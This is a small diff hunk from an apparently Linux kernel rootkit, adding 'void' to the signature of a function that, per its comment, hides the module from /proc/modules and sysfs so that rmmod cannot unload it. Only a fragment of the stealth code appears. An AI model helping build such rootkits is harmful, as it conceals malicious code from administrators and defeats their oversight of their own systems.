@@ -18,7 +18,7 @@ static void rooti_hideme_from_sysfs(void)
     Hides the rootkit from userspace by removing the entries from both procs (/proc/modules file)
     and sysfs (/sys/module/<module> folder). This also protects it from unloading via tools like rmmod.
 */
-int rooti_hideme()
+int rooti_hideme(void)
 {
     ROOTI_RESOLVE_SYM_ADDR(struct mutex *, module_mutex, -ENOENT);
 
